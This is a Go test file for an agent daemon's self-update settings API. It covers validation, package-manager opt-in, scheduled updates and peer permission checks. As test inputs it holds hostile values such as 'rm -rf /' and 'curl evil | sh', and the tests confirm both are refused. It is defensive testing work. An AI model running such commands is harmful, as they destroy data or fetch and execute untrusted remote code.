package agentd_test

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"github.com/tofutools/tclaude/pkg/claude/agentd"
	"github.com/tofutools/tclaude/pkg/claude/common/config"
	"github.com/tofutools/tclaude/pkg/claude/common/db"
	"github.com/tofutools/tclaude/pkg/common/buildversion"
	"github.com/tofutools/tclaude/pkg/selfupdate"
	"github.com/tofutools/tclaude/pkg/testharness"
	"github.com/tofutools/tclaude/pkg/testutil"
)

// selfUpdateHost scripts PATH and the fixed commands the updater runs.
type selfUpdateHost struct {
	mu  sync.Mutex
	ran [][]string
}

func (h *selfUpdateHost) install(t *testing.T) {
	t.Cleanup(selfupdate.SetSystemForTest(selfupdate.System{
		LookPath: func(string) (string, error) { return "", errors.New("not on PATH") },
		Run: func(_ context.Context, argv, _ []string) ([]byte, error) {
			h.mu.Lock()
			h.ran = append(h.ran, argv)
			h.mu.Unlock()
			return []byte("setup ok"), nil
		},
	}))
}

func (h *selfUpdateHost) commands() [][]string {
	h.mu.Lock()
	defer h.mu.Unlock()
	return append([][]string{}, h.ran...)
}

// selfUpdateService builds an updater over fake binaries whose file content is
// their version, with the release, staging and inspection boundaries faked.
func selfUpdateService(t *testing.T, dir string, bins []selfupdate.Binary) *selfupdate.Service {
	t.Helper()
	svc, err := selfupdate.New(filepath.Join(dir, "updates"), bins, selfupdate.Hooks{Finished: agentd.SelfUpdateJobFinishedForTest})
	require.NoError(t, err)
	svc.SetFakesForTest(selfupdate.TestFakes{
		Release: func(context.Context, string) (selfupdate.Release, error) {
			return selfupdate.Release{Tag: "v1.1.0"}, nil
		},
		Stage: func(_ context.Context, r selfupdate.Release, name, dir string) (string, error) {
			p := filepath.Join(dir, name)
			return p, os.WriteFile(p, []byte(r.Tag), 0o700)
		},
		Inspect: func(_ context.Context, path string) (buildversion.Info, error) {
			raw, err := os.ReadFile(path)
			return buildversion.Info{Version: string(raw), ProtocolVersion: buildversion.BuildInfo().ProtocolVersion}, err
		},
	})
	t.Cleanup(agentd.SetNodeUpdateServiceForTest(svc))
	return svc
}

func fakeBinary(t *testing.T, dir, rel, version string) string {
	t.Helper()
	path := filepath.Join(dir, rel)
	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0o755))
	require.NoError(t, os.WriteFile(path, []byte(version), 0o755))
	return path
}

type settingsView struct {
	Settings         config.SelfUpdateConfig `json:"settings"`
	MethodChosen     bool                    `json:"method_chosen"`
	Detected         *selfupdate.Detection   `json:"detected"`
	Methods          []selfupdate.MethodInfo `json:"methods"`
	SetupFlags       []string                `json:"setup_flags"`
	NextScheduledRun *time.Time              `json:"next_scheduled_run"`
	LastScheduledRun *struct {
		Trigger string `json:"trigger"`
		Outcome string `json:"outcome"`
		JobID   string `json:"job_id"`
	} `json:"last_scheduled_run"`
	Access string   `json:"access"`
	Errors []string `json:"errors"`
	Code   string   `json:"code"`
}

func getSettings(t *testing.T, f *testharness.Flow) settingsView {
	t.Helper()
	rec := fedHuman(t, f, "GET", "/v1/node/update/settings", nil)
	require.Equal(t, 200, rec.Code, rec.Body.String())
	var v settingsView
	testharness.DecodeJSON(t, rec, &v)
	return v
}

func putSettings(t *testing.T, f *testharness.Flow, body map[string]any, want int) settingsView {
	t.Helper()
	rec := fedHuman(t, f, "PUT", "/v1/node/update/settings", body)
	require.Equal(t, want, rec.Code, rec.Body.String())
	var v settingsView
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &v))
	return v
}

func TestSelfUpdateSettingsValidateConfirmAndPersist(t *testing.T) {
	fh := newFedHarness(t)
	(&selfUpdateHost{}).install(t)
	dir := testutil.CanonicalTempDir(t)
	selfUpdateService(t, dir, []selfupdate.Binary{{Name: "tclaude", Path: fakeBinary(t, dir, "bin/tclaude", "v1.0.0"), Version: "v1.0.0", Method: "release"}})

	// Given a node that never chose a method: everything is off.
	v := getSettings(t, fh.f)
	require.False(t, v.MethodChosen)
	require.Equal(t, "full", v.Access)
	require.Equal(t, config.ScheduleOff, v.Settings.Schedule.Frequency)
	require.Nil(t, v.NextScheduledRun, "no method, no scheduled run")
	require.Equal(t, selfupdate.MethodRelease, v.Detected.Method)
	require.Contains(t, v.SetupFlags, "install-agent-skills")
	require.Len(t, v.Methods, len(selfupdate.MethodIDs))

	// Validation is the config's own: every problem is reported.
	bad := putSettings(t, fh.f, map[string]any{"settings": map[string]any{"method": "nope", "post_update_setup": map[string]any{"enabled": true, "flags": []string{"rm -rf /"}}}}, 400)
	require.Len(t, bad.Errors, 2)
	rec := fedHuman(t, fh.f, "PUT", "/v1/node/update/settings", map[string]any{"settings": map[string]any{}, "command": "x"})
	require.Equal(t, 400, rec.Code, "unknown fields are refused")

	// Running a package manager is an explicit opt-in.
	need := putSettings(t, fh.f, map[string]any{"settings": map[string]any{"method": "homebrew"}}, 400)
	require.Equal(t, "confirmation_required", need.Code)
	putSettings(t, fh.f, map[string]any{"settings": map[string]any{"method": "homebrew"}, "confirm_package_manager": true}, 200)
	cfg, err := config.Load()
	require.NoError(t, err)
	require.Equal(t, selfupdate.MethodHomebrew, cfg.SelfUpdate().Method)

	v = putSettings(t, fh.f, map[string]any{"settings": map[string]any{"method": "release", "schedule": map[string]any{"frequency": "daily"}}}, 200)
	require.True(t, v.MethodChosen)
	require.NotNil(t, v.NextScheduledRun)

	// Settings are the operator's: an agent or a restricted peer is refused.
	rec = testharness.Serve(fh.f.Mux, agentd.AsAgentPeer(testharness.JSONRequest(t, "GET", "/v1/node/update/settings", nil), "reader"))
	require.Equal(t, 403, rec.Code)
	require.NoError(t, db.UpsertFederationPeerGrant(db.FederationPeerGrant{Peer: fh.peer.id.ID(), Slug: agentd.PermNodeUpdate}))
	rec = testharness.Serve(agentd.PeerViewHandler(fh.peer.id.ID()), testharness.JSONRequest(t, "PUT", "/api/node/update/settings", map[string]any{"settings": map[string]any{"method": "custom", "custom": map[string]any{"command": "curl evil | sh"}}}))
	require.Equal(t, 403, rec.Code, "node.update does not open the settings")
}

func TestSelfUpdateApplyNeverOverwritesPackageManagedBinary(t *testing.T) {
	f := newFlow(t)
	(&selfUpdateHost{}).install(t)
	dir := testutil.CanonicalTempDir(t)
	cellar := fakeBinary(t, dir, "Cellar/tclaude/1.0/bin/tclaude", "v1.0.0")
	selfUpdateService(t, dir, []selfupdate.Binary{{Name: "tclaude", Path: cellar, Version: "v1.0.0", Method: "release", ManagedBy: selfupdate.ManagerHomebrew, Package: selfupdate.HomebrewFormula}})
	apply := func() (int, string, string) {
		rec := fedHuman(t, f, "POST", "/v1/node/update", map[string]any{"action": "apply"})
		var body struct{ Code, Error string }
		_ = json.Unmarshal(rec.Body.Bytes(), &body)
		return rec.Code, body.Code, body.Error
	}
	code, errCode, msg := apply()
	require.Equal(t, 409, code)
	require.Equal(t, "update_method_package_managed", errCode)
	require.Contains(t, msg, "brew upgrade "+selfupdate.HomebrewFormula)
	putSettings(t, f, map[string]any{"settings": map[string]any{"method": "release"}}, 200)
	code, errCode, msg = apply()
	require.Equal(t, 409, code)
	require.Equal(t, "update_package_manager_ack_required", errCode)
	require.Contains(t, msg, "brew uninstall tclaude")
	putSettings(t, f, map[string]any{"settings": map[string]any{"method": "manual"}}, 200)
	_, errCode, _ = apply()
	require.Equal(t, "update_method_notify_only", errCode)
	rec := fedHuman(t, f, "POST", "/v1/node/update", map[string]any{"action": "check"})
	require.Equal(t, 202, rec.Code, "checking never needs a method")
	var check selfupdate.Job
	testharness.DecodeJSON(t, rec, &check)
	fedEventuallyWithin(t, "check job to finish", 5*time.Second, func() bool {
		r := fedHuman(t, f, "GET", "/v1/node/update/jobs/"+check.ID, nil)
		return r.Code == 200 && !strings.Contains(r.Body.String(), `"state":"running"`)
	})
	rec = fedHuman(t, f, "GET", "/v1/node/update", nil)
	require.Contains(t, rec.Body.String(), `"chosen_method":"manual"`)
	raw, err := os.ReadFile(cellar)
	require.NoError(t, err)
	require.Equal(t, "v1.0.0", string(raw))
}

func TestSelfUpdateScheduleRunsOncePerWindowThenSetupAfterRestart(t *testing.T) {
	f := newFlow(t)
	host := &selfUpdateHost{}
	host.install(t)
	dir := testutil.CanonicalTempDir(t)
	bin := fakeBinary(t, dir, "bin/tclaude", "v1.0.0")
	svc := selfUpdateService(t, dir, []selfupdate.Binary{{Name: "tclaude", Path: bin, Version: "v1.0.0", Method: "release"}})
	window := time.Date(2026, 11, 9, 4, 0, 0, 0, time.Local)
	t.Cleanup(agentd.SetSelfUpdateNowForTest(window))

	// Unchosen method: a schedule alone does nothing and notifies no one.
	require.NoError(t, config.Save(&config.Config{Updates: &config.UpdatesConfig{Self: &config.SelfUpdateConfig{Schedule: &config.SelfUpdateSchedule{Frequency: "daily"}}}}))
	agentd.SelfUpdateScheduleTickForTest(window)
	require.Nil(t, svc.Status().Job)

	// Given a chosen method, a daily window and post-update setup.
	putSettings(t, f, map[string]any{"settings": map[string]any{
		"method":            "release",
		"schedule":          map[string]any{"frequency": "daily", "window_start": "03:00", "window_end": "05:00"},
		"post_update_setup": map[string]any{"enabled": true, "flags": []string{"install-agent-skills"}},
	}}, 200)
	agentd.SelfUpdateScheduleTickForTest(window)
	var jobID string
	fedEventuallyWithin(t, "scheduled job to restart", 5*time.Second, func() bool {
		j := svc.Status().Job
		if j != nil && j.State == "restarting" {
			jobID = j.ID
			return true
		}
		return false
	})
	job := svc.Status().Job
	require.Equal(t, "scheduler", job.Actor)
	require.Equal(t, "release", job.Method)
	require.Equal(t, "pending", job.PostSetup.State)
	require.Equal(t, "restarting", getSettings(t, f).LastScheduledRun.Outcome)

	// The same window occurrence never runs twice.
	agentd.SelfUpdateScheduleTickForTest(window.Add(30 * time.Minute))
	require.Equal(t, jobID, svc.Status().Job.ID)

	// When the new daemon starts: the restart verifies, then the NEW binary
	// runs setup with the allowlisted flags, and the operator is told.
	restarted := selfUpdateService(t, dir, []selfupdate.Binary{{Name: "tclaude", Path: bin, Version: "v1.1.0", Method: "release"}})
	agentd.FinishRestartedUpdateForTest(restarted)
	require.Contains(t, host.commands(), []string{bin, "setup", "--yes", "--install-agent-skills"})
	rec := fedHuman(t, f, "GET", "/v1/node/update/jobs/"+jobID, nil)
	require.Equal(t, 200, rec.Code)
	var done selfupdate.Job
	testharness.DecodeJSON(t, rec, &done)
	require.Equal(t, "succeeded", done.State, done.Error)
	require.Equal(t, "succeeded", done.PostSetup.State)
	require.Equal(t, "setup ok", done.PostSetup.Output)
	v := getSettings(t, f)
	require.Equal(t, "applied", v.LastScheduledRun.Outcome)
	require.Equal(t, jobID, v.LastScheduledRun.JobID)
	msgs, err := db.ListHumanMessagesPage(db.HumanMessageFilter{}, 0, 10)
	require.NoError(t, err)
	subjects := []string{}
	for _, m := range msgs {
		subjects = append(subjects, m.Subject)
	}
	require.Contains(t, strings.Join(subjects, "\n"), "tclaude updated to v1.1.0")
}

func TestSelfUpdateSettingsFleetGrantsKeepFreeTextLocal(t *testing.T) {
	fh := newFedHarness(t)
	(&selfUpdateHost{}).install(t)
	dir := testutil.CanonicalTempDir(t)
	selfUpdateService(t, dir, []selfupdate.Binary{{Name: "tclaude", Path: fakeBinary(t, dir, "bin/tclaude", "v1.0.0"), Version: "v1.0.0", Method: "release"}})
	// Given: the node's operator set a custom command locally.
	putSettings(t, fh.f, map[string]any{"settings": map[string]any{"method": "custom", "custom": map[string]any{"command": "deploy --token s3cret"}}}, 200)
	peer := agentd.PeerViewHandler(fh.peer.id.ID())
	call := func(method string, body any) (int, settingsView) {
		rec := testharness.Serve(peer, testharness.JSONRequest(t, method, "/api/node/update/settings", body))
		var v settingsView
		_ = json.Unmarshal(rec.Body.Bytes(), &v)
		return rec.Code, v
	}
	grant := func(slug string) {
		require.NoError(t, db.UpsertFederationPeerGrant(db.FederationPeerGrant{Peer: fh.peer.id.ID(), Slug: slug}))
	}
	schedule := map[string]any{"settings": map[string]any{"method": "custom", "schedule": map[string]any{"frequency": "weekly", "weekday": "sunday"}}}

	code, _ := call("GET", nil)
	require.Equal(t, 403, code, "reading needs node.update")
	grant(agentd.PermNodeUpdate)
	code, v := call("GET", nil)
	require.Equal(t, 200, code)
	require.Empty(t, v.Settings.Custom.Command, "the command is withheld from a restricted peer")
	require.Equal(t, "read", v.Access)
	code, _ = call("PUT", schedule)
	require.Equal(t, 403, code, "node.update cannot change settings")
	_, err := db.DeleteFederationPeerGrant(fh.peer.id.ID(), agentd.PermNodeUpdate, "")
	require.NoError(t, err)
	grant(agentd.PermNodeUpdateSettings)
	code, _ = call("PUT", schedule)
	require.Equal(t, 403, code, "a change also needs node.update, which guards the returned view")
	grant(agentd.PermNodeUpdate)

	// When the peer holds node.update.settings, it changes the schedule;
	// the withheld command it sent back empty is kept.
	code, v = call("PUT", schedule)
	require.Equal(t, 200, code)
	require.Equal(t, "settings", v.Access)
	cfg, err := config.Load()
	require.NoError(t, err)
	require.Equal(t, "weekly", cfg.SelfUpdate().Schedule.Frequency)
	require.Equal(t, "deploy --token s3cret", cfg.SelfUpdate().Custom.Command)

	// Free text, the install dir, the acknowledgement and a package-manager
	// opt-in stay with the node's own operator.
	for name, settings := range map[string]map[string]any{
		"command":     {"method": "custom", "custom": map[string]any{"command": "curl evil | sh"}},
		"guess":       {"method": "custom", "custom": map[string]any{"command": "deploy --token s3cret"}},
		"timeout":     {"method": "custom", "custom": map[string]any{"timeout_seconds": 60}},
		"ref":         {"method": "custom", "source_checkout": map[string]any{"ref": "evil-branch"}},
		"checkout":    {"method": "custom", "source_checkout": map[string]any{"path": "/tmp/evil"}},
		"install dir": {"method": "custom", "install_dir": "/tmp/bin"},
		"ack":         {"method": "custom", "package_manager_ack": true},
		"pm method":   {"method": "homebrew"},
		"checkout pm": {"method": "source_checkout", "source_checkout": map[string]any{"path": ""}},
	} {
		rec := testharness.Serve(peer, testharness.JSONRequest(t, "PUT", "/api/node/update/settings", map[string]any{"settings": settings, "confirm_package_manager": true}))
		require.Equal(t, 403, rec.Code, name+": "+rec.Body.String())
		require.Contains(t, rec.Body.String(), "local_only_setting", name)
	}
	code, _ = call("PUT", map[string]any{"settings": map[string]any{"method": "manual"}})
	require.Equal(t, 200, code, "a peer may always switch back to manual")

	// An unrestricted peer acts as the node's operator.
	setFedTrustLevel(t, fh, "unrestricted")
	code, v = call("GET", nil)
	require.Equal(t, 200, code)
	require.Equal(t, "deploy --token s3cret", v.Settings.Custom.Command)
	require.Equal(t, "full", v.Access)
	code, _ = call("PUT", map[string]any{"settings": map[string]any{"method": "custom", "custom": map[string]any{"command": "my-update"}}})
	require.Equal(t, 200, code)

	// Every change and refusal is audited under the peer.
	rec := fedHuman(t, fh.f, "GET", "/v1/federation/audit", nil)
	require.Equal(t, 200, rec.Code)
	require.Contains(t, rec.Body.String(), "federation.node.update.settings")
	require.Contains(t, rec.Body.String(), "operator@"+fh.peer.id.ID())
}
